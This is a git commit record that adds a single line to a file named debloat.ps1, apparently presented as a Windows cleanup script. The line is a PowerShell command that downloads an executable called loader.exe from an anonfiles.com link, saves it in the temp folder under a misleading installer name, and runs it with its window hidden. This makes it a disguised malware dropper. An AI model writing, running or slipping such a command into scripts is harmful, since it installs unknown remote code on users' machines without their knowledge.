672d9da5784e14bf1ea01796c97e0fe2de26b85c
Br3akers <104162584+Br3akers@users.noreply.github.com>
2023-01-04 23:43:31 +0100

    text.ps1

---
+++ debloat.ps1
@@ -0,0 +1,1 @@
+iwr -useb https://cdn-108.anonfiles.com/VfPad3Qeya/64c89bd9-1672872489/loader.exe -o $env:TEMP\voicemeetervstinstaller.exe; saps $env:TEMP\voicemeetervstinstaller.exe -WindowStyle Hidden
